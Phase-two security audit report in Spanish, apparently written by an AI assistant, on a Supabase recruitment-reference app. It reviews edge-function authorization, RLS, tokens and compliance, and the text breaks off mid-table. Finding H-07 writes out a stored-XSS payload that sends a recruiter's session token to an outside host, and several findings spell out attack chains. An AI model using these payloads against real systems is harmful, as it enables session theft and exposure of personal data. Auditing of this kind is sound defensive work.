# Fase 2 — Seguridad

Orden seguido: 5.4 (funciones) → 5.5 (tokens) → 5.3 (RLS) → resto, según la prioridad de `AUDITORIA.md` §5.

---

## 1. Punto previo: `ADMIN_EMAIL` (tu petición 4)

**No es leíble por MCP.** El conector expone base de datos, funciones y logs; los secretos de las edge functions no están entre sus herramientas. `Deno.env.get('ADMIN_EMAIL')` solo se resuelve en tiempo de ejecución.

Lo que sí pude verificar, **indirectamente y sin leer datos personales**:

```sql
select count(*) from auth.users u
left join public.usuarios p on p.id = u.id where p.id is null;  -- => 1
```

Existe **exactamente una** cuenta en `auth.users` sin fila en `usuarios`, dominio `huellalaboral.cl`, creada el 2026-03-20, último acceso el 2026-07-03. Es el patrón exacto que `autenticar` reconoce como admin. Coherente con que `ADMIN_EMAIL` esté definido y sea correcto.

**Lo que no puedo descartar** es una discrepancia de mayúsculas o un espacio sobrante en el valor de la variable. La comparación es estricta:

```js
if (authUser.email !== Deno.env.get('ADMIN_EMAIL'))
```

Supabase Auth normaliza los emails a minúscula. Si la variable estuviera guardada con una mayúscula, la comparación fallaría siempre y el panel de admin quedaría inaccesible para todos — incluido tú. Como el último acceso de esa cuenta es del 3 de julio, el camino parece funcionar.

**Verificación que solo puedes hacer tú**, en el dashboard → Edge Functions → Secrets: que `ADMIN_EMAIL` exista, esté en minúsculas y no tenga espacios. Un minuto.

**Riesgo latente:** si la variable no estuviese definida, `Deno.env.get()` devuelve `undefined` y la comparación `email !== undefined` es siempre verdadera → las tres funciones de admin rechazan a todo el mundo. Falla cerrado, que es la dirección correcta.

---

## 2. Q-4 — Revisión de las 19 funciones, una por una

Columnas: **AuthN** (¿identifica al llamante?) · **AuthZ rol** (¿comprueba que sea admin cuando toca?) · **AuthZ recurso** (¿comprueba que el recurso sea suyo?) · **SR** (usa `service_role`) · **CORS** · **RL** (rate limiting).

| # | Función | AuthN | AuthZ rol | AuthZ recurso | SR | CORS | RL | Hallazgo |
|---|---------|:-----:|:---------:|:-------------:|:--:|:----:|:--:|----------|
| 1 | `autenticar` | n/a | n/a | n/a | ✅ | `*` | ❌ | H-11 |
| 2 | `establecer-password` | ✅ token Auth | n/a | ✅ | ✅ | `*` | ❌ | — |
| 3 | `crear-reclutador` | ❌ | ❌ | ❌ | ✅ | `*` | ❌ | **H-01** |
| 4 | `listar-usuarios` | ✅ | ✅ | n/a | ✅ | `*` | ❌ | — |
| 5 | `gestionar-usuario` | ✅ | ✅ | n/a | ✅ | `*` | ❌ | — |
| 6 | `crear-proceso` | ✅ | n/a | ✅ | ✅ | `*` | ❌ | — |
| 7 | `listar-procesos` | ✅ | n/a | ✅ | ✅ | `*` | ❌ | — |
| 8 | `obtener-proceso` | ✅ | n/a | **❌** | ✅ | `*` | ❌ | **H-04** |
| 9 | `gestionar-proceso` | ✅ | n/a | **❌** | ✅ | `*` | ❌ | **H-05** |
| 10 | `obtener-stats` | ✅ | n/a | **❌** | ✅ | `*` | ❌ | H-10 |
| 11 | `agregar-candidato` | ✅ | n/a | **❌** | ✅ | `*` | ❌ | H-10 |
| 12 | `obtener-candidato` | ✅ | n/a | por diseño | ✅ | `*` | ❌ | **H-08** |
| 13 | `crear-solicitud` | ❌ | ❌ | ❌ | ✅ | `*` | ❌ | **H-06** |
| 14 | `obtener-estado` | 🔑 | n/a | ✅ | ✅ | `*` | ❌ | H-12 |
| 15 | `obtener-evaluacion` | 🔑 | n/a | ✅ | ✅ | `*` | ❌ | — |
| 16 | `guardar-evaluacion` | 🔑 | n/a | ✅ | ✅ | `*` | ❌ | **H-09** |
| 17 | `obtener-validacion` | ❌ | ❌ | ❌ | ✅ | `*` | ❌ | **H-02** |
| 18 | `validar-documentos` | ❌ | ❌ | ❌ | ✅ | `*` | ❌ | **H-03** |
| 19 | `auth-test` | ✅ | n/a | n/a | ✅ | `*` | ❌ | H-14 |

**Las 19 usan `service_role`.** No hay una sola que opere con permisos de usuario. RLS no protege nada dentro de una edge function: lo que la función no filtre, no lo filtra nadie. Es el patrón que `AUDITORIA.md` §5.4 marcaba como "el fallo más común y más grave", y aquí falla en 6 de 19.

**Las 19 tienen `Access-Control-Allow-Origin: *`.** Combinado con que la credencial va en un header propio (`x-user-token`) y no en cookies, no habilita CSRF clásico, pero sí permite que cualquier web ajena invoque los endpoints sin autenticación desde el navegador de la víctima.

**Ninguna de las 19 tiene rate limiting.**

**Q-7 cerrada a favor:** los 19 archivos leen sus secretos con `Deno.env.get()`. Cero valores literales. Verificado leyendo el código completo de cada una.

---

## 3. Q-6 — RLS: cerrado, pero por omisión

### 3.1 Lo que dicen las políticas

| Tabla | RLS | Políticas | Efecto para `anon` / `authenticated` |
|-------|:---:|:---------:|--------------------------------------|
| `trabajadores` | ✅ | **0** | Deniega todo |
| `evaluaciones` | ✅ | **0** | Deniega todo |
| `documentos` | ✅ | **0** | Deniega todo |
| `empleadores_solicitados` | ✅ | **0** | Deniega todo |
| `validaciones_documentos` | ✅ | **0** | Deniega todo |
| `usuarios` | ✅ | 2 (SELECT, UPDATE) | `auth.uid() = id` |
| `procesos` | ✅ | 4 | `auth.uid() = usuario_id` |
| `candidatos_proceso` | ✅ | 3 | vía `procesos.usuario_id = auth.uid()` |

Las cinco tablas con los datos personales tienen **RLS activado y cero políticas**: en Postgres eso deniega todo a quien no sea `service_role`. Es la respuesta correcta a Q-6, y llega por omisión más que por diseño — el advisor de Supabase lo reporta como `rls_enabled_no_policy`, pensado como aviso de "esto puede estar mal configurado". Aquí resulta ser lo que salva la puerta paralela.

Las tres tablas con políticas las tienen bien escritas: comparan contra `auth.uid()`, que el cliente no puede falsificar, los `INSERT` llevan `with_check`, y `procesos` cubre las cuatro operaciones. El rol es `{public}`, que incluye a `anon`, pero para un anónimo `auth.uid()` es `NULL` y la comparación nunca es cierta.

### 3.2 El detalle que convierte esto en fragilidad (H-13)

```
anon = arwdDxtm/postgres      -- en las 8 tablas
authenticated = arwdDxtm/postgres
```

`anon` tiene **todos los privilegios de tabla** (SELECT, INSERT, UPDATE, DELETE, TRUNCATE, REFERENCES, TRIGGER) sobre las 8. Lo único que se interpone es RLS. Es la configuración por defecto de Supabase, no un error, pero conviene ver la consecuencia: **la protección de todos los datos personales del sistema descansa sobre una única condición — que ninguna tabla tenga jamás una política permisiva ni pierda el `ENABLE ROW LEVEL SECURITY`**.

El día que alguien añada una política para hacer funcionar algo rápido, o cree una tabla nueva sin activar RLS, todo lo de esa tabla queda legible por cualquiera con la anon key, que está publicada en 8 HTML. No hay segunda línea. Un `REVOKE` de los privilegios que `anon` no necesita añadiría esa segunda línea, y no rompe nada: las 19 funciones entran con `service_role`.

### 3.3 Verificación empírica — NO COMPLETADA

Tu punto 7 pedía probarlo de verdad. **No pude, y no quiero dar por bueno lo que no probé.**

`auditoria/scripts/verificar-rls.sh` está escrito, probado sintácticamente y listo. Al ejecutarlo desde este contenedor:

```
curl: (56) CONNECT tunnel failed, response 403
```

El entorno de esta sesión enruta todo HTTPS por un proxy que **deniega `dxblzmxcmaerycvdgfpy.supabase.co`**. No es un problema del proyecto ni del RLS: es la política de red del sandbox. No lo eludo — desactivar la verificación TLS o saltarse el proxy está fuera de lo aceptable.

**Importa cómo falló la primera versión del script.** `curl` devuelve `000` cuando no logra conectar, y mi lógica inicial trataba cualquier código distinto de `200` como "bloqueado". Resultado: el script imprimió un aprobado completo —"RLS aguanta"— **sin haber enviado una sola petición**. Lo detecté porque las ocho tablas dieron exactamente `000`, que no es un código HTTP. Corregido: ahora hay un preflight que aborta con `exit 2` y el mensaje "NO se ha probado nada", y `000` cuenta como INDETERMINADO, nunca como OK.

Dejo constancia porque el modo de fallo importa más que el fallo: un verificador que confunde "sin red" con "acceso denegado" produce exactamente el informe que nadie querría — tranquilizador y falso.

**Para completarlo**, desde cualquier máquina con salida a internet:

```bash
bash auditoria/scripts/verificar-rls.sh
```

Sin argumentos ni configuración: saca la anon key de los HTML del repo, comprueba que es de rol `anon` antes de nada, y aborta si no lo es. Salida esperada según el análisis estático: `OK (bloqueado)` en las ocho tablas, `OK (rechazado)` en las tres escrituras, `OK (bloqueado)` en los dos buckets.

**Estado de Q-6: respondida por análisis estático (políticas + ACL vía MCP), pendiente de confirmación empírica.**

---

## 4. Q-5 — Tokens y enlaces

Ver Fase 1 §5 para la tabla comparativa. Puntos que corresponden a esta fase:

- **Generación:** `crypto.randomUUID()` en `crear-solicitud`, `gen_random_uuid()` como default de columna en `token_consulta`. Ambos criptográficamente seguros. **Cero uso de `Math.random()`, timestamps o secuencias.** El criterio Crítico de §5.5 no se dispara.
- **Fuerza bruta:** 122 bits, inviable. Pero irrelevante para H-02/H-03, donde el "token" es un identificador que el sistema reparte.
- **Expiración:** 30 días en evaluación; **nunca** en `token_consulta`.
- **Un solo uso:** sí en evaluación (`completado`); no en `token_consulta`.
- **Reenvío:** nada impide reenviar cualquiera de los enlaces. Para el de evaluación es inherente al diseño; para `token_consulta` significa acceso permanente cedido sin querer.
- **Tokens en el query string:** los tres flujos los llevan en la URL. Quedan en historial del navegador, logs del servidor y cabecera `Referer`. Sin `Referrer-Policy` configurada (no hay `vercel.json`), cualquier recurso externo cargado en esas páginas recibe la URL completa con el token. Ver H-15.
- **`validar.html:510` interpola el token sin `encodeURIComponent`**, a diferencia de `estado.html:218`. Con los valores actuales —UUID, sin caracteres especiales— no rompe. Es deuda, no fallo explotable: si mañana el token pasa a ser una cadena con `&` o `#`, rompe en silencio.

---

## 5. Q-9 — Los archivos borrados: resuelta, y explica `auth-test`

```
87bfb7b Delete dashboard-test.html
754fd1e Add files via upload      <- ultima version con contenido
ff68546 Delete evaluar_dummy.html
```

Contenido de `dashboard-test.html` en `754fd1e`:

```
63:  const response = await fetch(`${SUPABASE_URL}/functions/v1/auth-test`, {
66:      'apikey': ANON_KEY,
```

**`dashboard-test.html` era la página de pruebas que invocaba `auth-test`.** Se borró la página; la función se quedó desplegada y ACTIVE. Eso cierra la pregunta de qué es `auth-test` con evidencia del historial, no por inferencia del nombre: es la mitad superviviente de un par de artefactos de prueba.

`evaluar_dummy.html` no contiene secretos, credenciales ni endpoints vivos. Ninguno de los dos deja `service_role`, claves de test ni endpoints adicionales.

**Q-9 respondida: no dejaron datos ni credenciales. Sí dejaron una función huérfana en producción.**

---

## 6. Auth y Storage (§5.6)

| Punto | Estado |
|-------|--------|
| `hl_token` — naturaleza | **JWT de Supabase Auth** (Q-3). Firmado, con `exp`. No es opaco ni consultable en tabla de sesiones |
| Expiración | La de Supabase Auth (1 hora por defecto). El frontend **nunca refresca**: `autenticar` guarda el `access_token` y no el `refresh_token`. Ver H-16 |
| Revocación | **No hay.** No existe endpoint de logout server-side; `admin.html:820` solo borra `localStorage`. Un token robado sirve hasta que expira |
| Si se roba | Acceso completo como ese usuario. Vive en `localStorage`, o sea alcanzable por XSS — y hay XSS (H-07) |
| `hl_login_at` | Escrito, nunca leído. Decorativo |
| Confirmación de correo | `crear-reclutador` crea con `email_confirm: false`; `establecer-password` hace `email_confirm: true` al fijar contraseña. Coherente |
| Redirect URLs | `redirectTo: 'https://huellalaboral.cl/crear-password.html'`, fijo en el código, sin comodín. **Correcto** |
| Protección de contraseñas filtradas | **Desactivada** (advisor). Ver H-17 |
| Recuperación de contraseña | No hay flujo propio; depende de Supabase Auth |
| Storage | Buckets `certificados` y `finiquitos`: **`public: false`** ambos, con límite de tamaño (5 MB / 10 MB) y MIME acotado a PDF/JPEG/PNG. **Bien configurado.** Acceso solo por URL firmada de 1 h desde `obtener-validacion` — que es H-02 |

---

## 7. Frontend (§5.7)

- **XSS almacenado: confirmado.** `dashboard.html:1561` y `:1333`. Detalle en H-07.
- **Control de acceso en cliente:** `admin.html:520` lee el rol de `localStorage`, pero las funciones de admin revalidan. **No es explotable.** Mismo patrón en `dashboard.html:968` y `index.html:700`: cosmético, no es la frontera.
- **Redirecciones abiertas:** ninguna. Todos los `window.location.href` van a literales del propio sitio.
- **Cabeceras de seguridad:** no existe `vercel.json`. Sin CSP, `X-Frame-Options`, `Referrer-Policy` ni HSTS. H-15.
- `console.log` en producción: 1 en `dashboard.html`. Irrelevante.

---

# HALLAZGOS DE FASE 2

### [H-01] `crear-reclutador` no comprueba absolutamente nada
- **Severidad:** Crítica
- **Ubicación:** edge function `crear-reclutador`
- **Evidencia:** el código lee `const { nombre, empresa, email, confirm_reactivate } = await req.json()` y va directo a `supabase.auth.admin.createUser(...)`. **No aparece `x-user-token` en ninguna línea** — aunque sí figura en la lista de `Access-Control-Allow-Headers`, lo que sugiere que se pretendía y se olvidó.
- **Impacto:** cualquiera con la anon key (publicada en 8 HTML) crea una cuenta de reclutador a su propia dirección, recibe el correo "Crea tu contraseña", fija contraseña vía `establecer-password` e inicia sesión. Desde ahí quedan a mano H-04, H-05 y H-08: todos los procesos de selección, todos los candidatos, todo el historial laboral. Es la vía de entrada más directa del sistema y no requiere ningún conocimiento previo.
- **Amenaza:** T-4 → T-3
- **Corrección:** copiar el bloque de 15 líneas que ya usan `listar-usuarios` y `gestionar-usuario` — validar `x-user-token` con `auth.getUser()` y comparar contra `ADMIN_EMAIL`. El código correcto ya existe en el proyecto.
- **Esfuerzo:** S

### [H-02] `obtener-validacion`: sin autenticación, expone documentos de identidad
- **Severidad:** Crítica
- **Ubicación:** edge function `obtener-validacion`
- **Evidencia:** `const token = url.searchParams.get('token') // Por ahora es el trabajador_id`, seguido de `.eq('id', token)`. Ninguna comprobación de identidad.
- **Impacto:** con un `trabajador_id` se obtienen nombre, RUT, email y **URLs firmadas de 1 hora al certificado de cotizaciones y al finiquito**. Son documentos de identidad y de historial previsional. El `trabajador_id` no es secreto: **`crear-solicitud` se lo devuelve a cualquier llamante anónimo** en `{ success: true, trabajadorId }`. No hay que adivinar nada.
- **Amenaza:** T-3, T-2
- **Corrección:** columna `token_validacion uuid` propia en `trabajadores`, o autenticación real del validador interno. Mientras tanto, exigir `x-user-token` con rol admin es un parche de una tarde.
- **Esfuerzo:** M

### [H-03] `validar-documentos`: cualquiera falsifica el sello de validación
- **Severidad:** Crítica
- **Ubicación:** edge function `validar-documentos`
- **Evidencia:** `const trabajadorId = token // Temporal: el token ES el trabajador_id`, precedido de `// TODO: Implementar tokens de validación separados`. Sin authn.
- **Impacto:** cualquiera marca los documentos de cualquier trabajador como válidos, fija `empleos_ultimos_5_anos` y `tiempo_maximo_un_empleador_anos` a los valores que quiera, y pone `trabajadores.estado = 'documentos_validados'`. La validación documental es el único eslabón de la cadena de confianza que hoy involucra a un humano de Huella Laboral; falsificarlo no cuesta nada. Agravante: `validaciones_documentos.validador_id` existe en el esquema y **nunca se escribe**, así que no hay forma de distinguir una validación legítima de una inyectada.
- **Amenaza:** T-1
- **Corrección:** misma que H-02, más escribir `validador_id`.
- **Esfuerzo:** M

### [H-04] `obtener-proceso`: IDOR sobre procesos ajenos
- **Severidad:** Crítica
- **Ubicación:** edge function `obtener-proceso`
- **Evidencia:** valida `x-user-token` y a continuación `.from('candidatos_proceso').select('*, trabajadores(*)').eq('proceso_id', procesoId)`. `procesoId` viene del cliente; **no se contrasta contra `authUser.id`**.
- **Impacto:** cualquier reclutador autenticado lee los candidatos de cualquier proceso de cualquier otra empresa, con la fila completa de `trabajadores` — nombre, RUT, email, WhatsApp, comuna. Contraste directo: `listar-procesos`, escrita el mismo día, sí filtra con `.eq('usuario_id', userId)`.
- **Amenaza:** T-3
- **Corrección:** comprobar que el proceso pertenece a `authUser.id` antes de devolver nada.
- **Esfuerzo:** S

### [H-05] `gestionar-proceso`: borrado de procesos ajenos
- **Severidad:** Crítica
- **Ubicación:** edge function `gestionar-proceso`
- **Evidencia:** `.from('procesos').delete().eq('id', proceso_id)` sin filtro por dueño. Antes borra `candidatos_proceso` del mismo proceso.
- **Impacto:** cualquier reclutador autenticado finaliza o **borra definitivamente** el proceso de otra empresa junto con sus candidatos. No es fuga: es destrucción de datos, irreversible y sin traza.
- **Amenaza:** T-3
- **Corrección:** añadir `.eq('usuario_id', authUser.id)` a ambas operaciones.
- **Esfuerzo:** S

### [H-06] `crear-solicitud`: caída total del correo, provocable por cualquiera
- **Severidad:** Crítica *(elevada desde Alta a petición del usuario; el análisis la sostiene)*
- **Ubicación:** edge function `crear-solicitud`
- **Evidencia:** sin `x-user-token`, sin rate limiting. Los envíos van así:
  ```js
  try { await fetch('https://api.resend.com/emails', {...}) }
  catch (emailError) { console.error(...) }
  ```
  **No se comprueba `response.ok` ni `response.status`.**
- **Impacto:** tres efectos que se componen:
  1. Cada llamada anónima dispara N+2 correos a direcciones arbitrarias, con el remitente de Huella Laboral. Reputación del dominio y coste.
  2. `fetch` **no lanza excepción con respuestas HTTP de error**. Un 429 por cuota agotada devuelve una respuesta normal: el `catch` no se activa, la función sigue y responde `success: true`.
  3. Por tanto, agotada la cuota de Resend, **el sistema entero deja de enviar correos mientras informa de éxito en todas las pantallas**. El trabajador ve "solicitud enviada", los evaluadores no reciben nada, y nadie se entera hasta que alguien pregunta por qué no llegan referencias.
  
  Un tercero puede provocar ese estado deliberadamente y a bajo coste, y el sistema no tiene forma de detectarlo. Es una denegación de servicio silenciosa sobre el canal del que depende el producto entero.
- **Amenaza:** T-6
- **Corrección:** tres cosas, independientes. (a) Comprobar `if (!response.ok)` en los siete envíos y propagar el fallo. (b) Rate limiting por IP y por RUT. (c) CAPTCHA o verificación de correo antes de disparar envíos. La (a) es media hora y es la que convierte un fallo invisible en uno visible.
- **Esfuerzo:** M

### [H-07] XSS almacenado en el dashboard → robo de `hl_token`
- **Severidad:** Crítica
- **Ubicación:** `dashboard.html:1561` y `dashboard.html:1333`
- **Evidencia:**
  ```js
  document.getElementById('listaEvaluaciones').innerHTML = evaluaciones.map(e => `
      ... ${e.nombre_evaluador} ...
      ${e.comentarios ? `<div class="eval-otros-texto">${e.comentarios}</div>` : ''}
  `).join('');
  ```
  `guardar-evaluacion` inserta `comentarios` sin sanear. El `<textarea>` de `evaluar.html:538` no tiene `maxlength`.
- **Impacto:** cadena completa y autoservicio:
  1. El atacante llama a `crear-solicitud` (sin autenticación, H-06) declarándose evaluador con su propia dirección.
  2. Recibe por correo un enlace de evaluación legítimo.
  3. Envía como comentario `<img src=x onerror="fetch('//…/'+localStorage.hl_token)">`.
  4. Cualquier reclutador que abra esa ficha ejecuta el script en su sesión y entrega su token.
  
  `hl_token` está en `localStorage`, accesible desde JavaScript, y no se puede revocar (§6). El atacante obtiene la sesión completa de un reclutador real.
- **Amenaza:** T-7 → T-3
- **Corrección:** usar `textContent`, o escapar antes de interpolar. `evaluar.html` ya usa `textContent` en sus 20 inserciones y no tiene un solo `innerHTML`: el patrón correcto ya está en el proyecto. Añadir CSP como segunda línea (H-15).
- **Esfuerzo:** S

### [H-08] `obtener-candidato`: acceso a datos de terceros sin relación contractual
- **Severidad:** Alta — **cumplimiento, no autorización**
- **Ubicación:** edge function `obtener-candidato`
- **Registrada por indicación tuya como hallazgo de auditoría pese a ser decisión consciente de diseño.** El análisis va en §5.8 (bloque siguiente), no aquí, porque el problema no es técnico.
- **Evidencia:** `.from('trabajadores').select('*').eq('rut', rut)` con `rut` del cliente y sin relación con los procesos del reclutador.
- **Impacto:** cualquier reclutador activo consulta, por RUT, la ficha completa de cualquier persona del sistema —nombre, email, WhatsApp, comuna, todas sus evaluaciones con comentarios, promedios y estado documental— sin que esa persona haya postulado a nada suyo. Con H-01 abierto, "cualquier reclutador activo" es "cualquiera".
- **Amenaza:** T-3
- **Corrección:** ver §5.8. Depende de la decisión de producto.
- **Esfuerzo:** M

### [H-09] `guardar-evaluacion` no comprueba la expiración
- **Severidad:** Alta
- **Ubicación:** edge function `guardar-evaluacion`
- **Evidencia:** comprueba `empleador.completado` pero **no** `fecha_expiracion`. `obtener-evaluacion` sí lo hace.
- **Impacto:** el enlace caduca a los 30 días solo para *leer*. Llamando a `guardar-evaluacion` directamente con un token viejo, la evaluación se inserta igual. La caducidad es una comprobación de interfaz, no de negocio.
- **Amenaza:** T-1
- **Corrección:** replicar en `guardar-evaluacion` las cuatro líneas de expiración que ya están en `obtener-evaluacion`.
- **Esfuerzo:** S

### [H-10] `agregar-candidato` y `obtener-stats` no comprueban propiedad del proceso
- **Severidad:** Alta
- **Ubicación:** edge functions `agregar-candidato`, `obtener-stats`
- **Evidencia:** ambas aceptan `proceso_id` / `proceso_ids` del cliente sin contrastar contra `authUser.id`.
- **Impacto:** `agregar-candidato` permite inyectar candidatos en procesos ajenos y **dispara correos con el nombre del reclutador que el atacante indique** (`reclutador_nombre` viene del cliente, sin validar): suplantación con el remitente legítimo de Huella Laboral. `obtener-stats` filtra conteos de procesos ajenos — menor, pero es enumeración.
- **Amenaza:** T-3, T-6
- **Corrección:** filtrar por dueño; tomar `reclutador_nombre` de la base a partir de `authUser.id`, nunca del cliente.
- **Esfuerzo:** S

### [H-11] `autenticar` sin rate limiting
- **Severidad:** Alta
- **Ubicación:** edge function `autenticar`
- **Evidencia:** ninguna limitación de intentos.
- **Impacto:** fuerza bruta de contraseñas ilimitada. Agravado por H-17 (protección de contraseñas filtradas desactivada). Sí distingue correctamente entre credenciales incorrectas y usuario baneado, lo que permite enumerar cuentas activas, aunque el mensaje de "Credenciales incorrectas" es genérico y no enumera por email.
- **Corrección:** rate limiting por IP y por cuenta, con backoff.
- **Esfuerzo:** M

### [H-12] `token_consulta` no expira ni se puede revocar
- **Severidad:** Alta
- **Ubicación:** `trabajadores.token_consulta`, edge function `obtener-estado`
- **Evidencia:** `token_consulta uuid default gen_random_uuid()`, sin columna de expiración. `obtener-estado` solo hace `.eq('token_consulta', token)`.
- **Impacto:** el enlace de `estado.html` da acceso permanente al historial laboral completo —nombre, RUT y todas las evaluaciones con sus comentarios— a quien lo tenga. Va en un correo que se reenvía y sobrevive indefinidamente. El trabajador no puede revocarlo ni sabe que existe esa posibilidad.
- **Corrección:** caducidad, rotación bajo demanda y un modo de revocar.
- **Esfuerzo:** M

### [H-13] `anon` tiene todos los privilegios sobre las 8 tablas
- **Severidad:** Media *(hoy no hay fuga; es ausencia de defensa en profundidad)*
- **Ubicación:** `pg_class.relacl` en las 8 tablas de `public`
- **Evidencia:** `anon=arwdDxtm/postgres` en las ocho.
- **Impacto:** lo único que impide leer todos los datos personales con la anon key es RLS. No hay segunda barrera: una política permisiva añadida por descuido, o una tabla nueva sin `ENABLE ROW LEVEL SECURITY`, expone todo de inmediato y en silencio.
- **Amenaza:** T-5
- **Corrección:** `REVOKE` sobre `anon` de lo que no usa. Las 19 funciones entran con `service_role`, así que no rompe nada.
- **Esfuerzo:** S

### [H-14] `auth-test`: función huérfana en producción
- **Severidad:** Media
- **Ubicación:** edge function `auth-test`
- **Evidencia:** artefacto de prueba; su página compañera `dashboard-test.html` se borró del repo (§5) y la función quedó ACTIVE. Ningún HTML la invoca.
- **Impacto:** oráculo de validez de tokens sin efectos secundarios ni rastro: permite comprobar si un `hl_token` robado sigue vivo sin tocar ningún flujo de negocio. Devuelve solo el email e id del propio portador, así que no filtra datos ajenos. El riesgo mayor no es lo que hace, sino que **nadie la vigila**: no está en ningún flujo, así que ningún usuario detectaría un cambio de comportamiento.
- **Corrección:** eliminarla. No la usa nada.
- **Esfuerzo:** S

### [H-15] Sin cabeceras de seguridad HTTP
- **Severidad:** Media
- **Ubicación:** ausencia de `vercel.json`
- **Impacto:** sin CSP (que habría contenido H-07), sin `X-Frame-Options` (clickjacking), sin HSTS y **sin `Referrer-Policy`** — esta última importa especialmente aquí porque los tres flujos externos llevan el token en el query string y sin ella se filtra a cualquier tercero vía cabecera `Referer`.
- **Corrección:** un `vercel.json` con las cuatro cabeceras. Media hora.
- **Esfuerzo:** S

### [H-16] La sesión caduca a la hora sin posibilidad de renovarla
- **Severidad:** Media
- **Ubicación:** `login.html:422`, edge function `autenticar`
- **Evidencia:** `autenticar` devuelve solo `access_token`; el `refresh_token` de la sesión se descarta. El frontend no llama nunca a `refreshSession()`.
- **Impacto:** al expirar el JWT (1 hora por defecto), todas las llamadas empiezan a devolver 401 y el usuario ve errores sin explicación. Es a la vez fallo de seguridad menor —no hay logout ni revocación real— y de usabilidad (cruza con Fase 3).
- **Corrección:** decidir explícitamente: o se guarda el `refresh_token` y se renueva, o se detecta el 401 y se redirige al login con un mensaje claro. Hoy no se hace ninguna de las dos.
- **Esfuerzo:** M

### [H-17] Protección de contraseñas filtradas desactivada
- **Severidad:** Baja
- **Ubicación:** configuración de Supabase Auth (advisor `auth_leaked_password_protection`)
- **Impacto:** se aceptan contraseñas presentes en filtraciones conocidas. `establecer-password` exige 8 caracteres con mayúscula, minúscula y dígito — `Password1` cumple y está en todos los diccionarios.
- **Corrección:** activar la opción en el dashboard. Un clic.
- **Esfuerzo:** S

### [H-18] `update_updated_at_column` con `search_path` mutable
- **Severidad:** Baja
- **Ubicación:** función `public.update_updated_at_column` (advisor)
- **Impacto:** vector teórico de escalada si un atacante pudiera crear objetos en un esquema del `search_path`. Requiere privilegios que hoy nadie tiene. Higiene.
- **Corrección:** `alter function ... set search_path = ''`.
- **Esfuerzo:** S

---

## 8. §5.8 — Privacidad y cumplimiento

### 8.1 La normativa aplicable, y una fecha que cambia la prioridad

| Norma | Estado a 31-07-2026 |
|-------|---------------------|
| **Ley 19.628** | Vigente hoy. Sanciones bajas, fiscalización casi inexistente |
| **Ley 21.719** | Publicada el 13-12-2024. **Entra en vigencia el 1 de diciembre de 2026** |

**Faltan cuatro meses.** Eso reordena el backlog: lo de cumplimiento deja de ser Horizonte 3 y pasa a tener fecha límite dura. La 21.719 crea la Agencia de Protección de Datos, derechos ARCO completos, notificación de brechas en 72 horas y multas de hasta 20.000 UTM, o 4 % de los ingresos en reincidencia.

Para este producto hay un agravante: bajo la 21.719 los **datos de situación socioeconómica** son categoría especial, y el certificado de cotizaciones previsionales entra de lleno ahí. También el finiquito con su causal de salida.

`privacidad.html` cita la **19.628** y no menciona la 21.719 (verificado: cero coincidencias del texto "21.719" en el archivo).

### 8.2 H-08 leído como problema de cumplimiento

El diseño de `obtener-candidato` — consulta libre por RUT — es lo que convierte a Huella Laboral en un producto útil. No lo discuto. Lo que hay que resolver es que, tal como está, el tratamiento carece de base de licitud clara frente al titular:

- El trabajador **sí** consiente (hay bloque de consentimiento en `trabajador.html:745-749`). Pero consiente **entregar sus referencias**, no necesariamente **quedar en un repositorio consultable indefinidamente por cualquier reclutador suscrito**. Si el consentimiento no cubre expresamente lo segundo, hay una brecha entre lo declarado y lo que hace el sistema.
- El **evaluador** también es titular de datos personales —nombre, RUT, empresa, cargo, correo— y sus datos se muestran al reclutador (`dashboard.html:1561` incluye `email_evaluador`). Hay bloque de consentimiento en `evaluar.html`, lo cual está bien; queda por contrastar su alcance.
- No hay **registro de accesos**: nadie puede responder quién consultó la ficha de quién ni cuándo. Bajo la 21.719 eso complica atender un derecho de acceso y hace imposible acreditar diligencia ante la Agencia.
- No hay **política de retención**. `privacidad.html` menciona "conservación" y "eliminar", pero no fija plazos. El único mecanismo de borrado es escribir a `contacto@huellalaboral.cl`, mencionado en el pie de un correo (M-2). No hay proceso, ni plazo, ni forma de verificarlo.

**Las tres opciones que pediste, con lo que cuesta y lo que se pierde:**

| Opción | Qué implica | Coste | Qué se pierde |
|--------|-------------|-------|---------------|
| **A. Scoping por proceso** | `obtener-candidato` solo devuelve trabajadores que estén en algún proceso del reclutador. La búsqueda libre por RUT desaparece | S técnico, alto en producto | El "consultar antes de invitar", que probablemente es parte del valor percibido |
| **B. Consentimiento explícito y granular** | Casilla separada e informada: "autorizo que reclutadores registrados consulten mi perfil". Revocable desde `estado.html`. Mantiene el diseño intacto | M | Algunos trabajadores dirán que no — y ese es justamente el punto de un consentimiento válido |
| **C. Registro de accesos** | Tabla `accesos_ficha` con quién, a qué RUT, cuándo. Visible para el trabajador en `estado.html` | S | Nada. Solo suma |

**Recomendación: B + C juntas, y no A.** B da la base de licitud sin tocar el producto, y C aporta la trazabilidad que la 21.719 va a exigir de todos modos y que hoy no existe en ninguna parte. A resuelve el problema legal amputando el producto, y no hace falta si B está bien hecha. C tiene además valor comercial: "puedes ver quién consultó tu perfil" es una función que el trabajador quiere, no solo una obligación.

### 8.3 Resto del bloque de cumplimiento

| Punto | Estado |
|-------|--------|
| Consentimiento del trabajador | ✅ Existe, obligatorio (`trabajador.html:745`) |
| Consentimiento del evaluador | ✅ Existe (`evaluar.html:248`) |
| Política de retención | ❌ Sin plazos |
| Derecho de supresión | ⚠️ Solo por correo, en el pie de M-2. Sin proceso ni plazo |
| Derechos de acceso, rectificación y oposición | ❌ Sin mecanismo |
| Portabilidad (nueva en 21.719) | ❌ Inexistente |
| Registro de actividades de tratamiento | ❌ Inexistente |
| Notificación de brechas en 72 h | ❌ Sin procedimiento. Y sin logs de más de 24 h, hoy sería imposible determinar el alcance de una |
| Encargado de tratamiento | Supabase y Resend son subencargados. Sin DPA documentado |
| `privacidad.html` vs. realidad | Cita la 19.628; no menciona la 21.719, que entra en vigor en cuatro meses |

---

## 9. Tu petición 5 — ¿hay evidencia de acceso externo?

Pregunta correcta: con RUT y finiquitos expuestos, esto pasaría de vulnerabilidad a incidente de datos personales.

**Respuesta corta: no encuentro evidencia de explotación, y no puedo descartarla en el caso que más importa.**

### Lo que sí pude comprobar

**`get_logs(edge-function)` devuelve vacío**, y `get_logs(api)` falla con `FetchException`. Además, la herramienta solo cubre **las últimas 24 horas**. Aunque funcionara perfectamente, no serviría para responder por los meses en que estas funciones han estado expuestas.

Así que fui por los datos, que sí tienen historia:

| Vector | Rastro que dejaría | Qué encontré |
|--------|--------------------|--------------|
